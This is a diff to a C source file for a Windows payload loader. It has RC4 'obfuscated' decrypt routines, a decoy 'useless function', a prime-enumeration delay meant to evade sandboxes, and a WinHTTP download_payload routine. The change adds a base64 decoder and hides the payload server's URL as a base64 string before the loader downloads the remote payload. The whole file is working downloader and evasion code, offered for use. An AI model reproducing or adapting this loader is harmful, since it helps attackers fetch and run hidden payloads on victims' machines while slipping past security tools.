@@ -3,6 +3,8 @@
 #include <stdio.h>
 #include <string.h>
 #include <math.h>
+#include <stdint.h>
+#include <stdlib.h>
 
 #pragma comment(lib, "winhttp.lib")
 
@@ -12,6 +14,31 @@ void obfuscated_encrypt(unsigned char* data, size_t data_len, unsigned char* key
 // RC4 decryption function (obfuscated)
 void obfuscated_decrypt(unsigned char* data, size_t data_len, unsigned char* key);
 
+// Base64 decoding function
+int base64_decode(const char* base64, unsigned char* out, size_t* out_len) {
+    static const unsigned char base64_table[65] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    size_t len = strlen(base64);
+    if (len % 4 != 0) return -1;  // Length of base64 encoded string should be a multiple of 4
+
+    *out_len = len / 4 * 3;
+    if (base64[len - 1] == '=') (*out_len)--;
+    if (base64[len - 2] == '=') (*out_len)--;
+
+    for (size_t i = 0, j = 0; i < len;) {
+        uint32_t sextet_a = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;
+        uint32_t sextet_b = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;
+        uint32_t sextet_c = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;
+        uint32_t sextet_d = base64[i] == '=' ? 0 & i++ : strchr(base64_table, base64[i++]) - base64_table;
+
+        uint32_t triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;
+
+        if (j < *out_len) out[j++] = (triple >> 16) & 0xFF;
+        if (j < *out_len) out[j++] = (triple >> 8) & 0xFF;
+        if (j < *out_len) out[j++] = triple & 0xFF;
+    }
+
+    return 0;
+}
 
 // Useless function
 void useless_function() {
@@ -133,16 +160,50 @@ unsigned char* download_payload(const wchar_t* url, size_t* payload_size) {
 
 int main(int argc, char* argv[]) {
 
-    //Delay execution by enumerating primes
-    delay_execution();
+    // Delay execution by enumerating primes
+    //delay_execution();
 
     // Useless function call
     useless_function();
 
-    // URL of the remote payload
-    const wchar_t* url = L"your server";
+    // Base64 encoded URL
+    const char* encoded_url = "5L2g5ZKL5Zue5LqL5bCP5LyZ5a2Q5oOz5bmy5Zib"; //base64±àÂëºóµÄurl
+
+    // Decode the base64 URL
+    size_t url_len = strlen(encoded_url);
+    size_t decoded_url_len = url_len / 4 * 3;
+    if (encoded_url[url_len - 1] == '=') decoded_url_len--;
+    if (encoded_url[url_len - 2] == '=') decoded_url_len--;
+
+    // Allocate memory for the decoded URL
+    unsigned char* decoded_url = (unsigned char*)malloc(decoded_url_len + 1);
+    if (decoded_url == NULL) {
+        fprintf(stderr, "Failed to allocate memory for decoded URL\n");
+        return 1;
+    }
+
+    size_t out_len = 0;
+    if (base64_decode(encoded_url, decoded_url, &out_len) != 0) {
+        fprintf(stderr, "Failed to decode base64 URL\n");
+        free(decoded_url);
+        return 1;
+    }
+    decoded_url[out_len] = '\0';
+
+    // Convert the decoded URL to a wide character string
+    size_t decoded_url_wchar_len = MultiByteToWideChar(CP_UTF8, 0, (char*)decoded_url, -1, NULL, 0);
+    wchar_t* decoded_url_wchar = (wchar_t*)malloc(decoded_url_wchar_len * sizeof(wchar_t));
+    if (decoded_url_wchar == NULL) {
+        fprintf(stderr, "Failed to allocate memory for wide char URL\n");
+        free(decoded_url);
+        return 1;
+    }
+    MultiByteToWideChar(CP_UTF8, 0, (char*)decoded_url, -1, decoded_url_wchar, decoded_url_wchar_len);
+    free(decoded_url);
+
     size_t payload_size = 0;
-    unsigned char* obfuscated_payload = download_payload(url, &payload_size);
+    unsigned char* obfuscated_payload = download_payload(decoded_url_wchar, &payload_size);
+    free(decoded_url_wchar);
 
     if (!obfuscated_payload) {
         fprintf(stderr, "Failed to download payload\n");
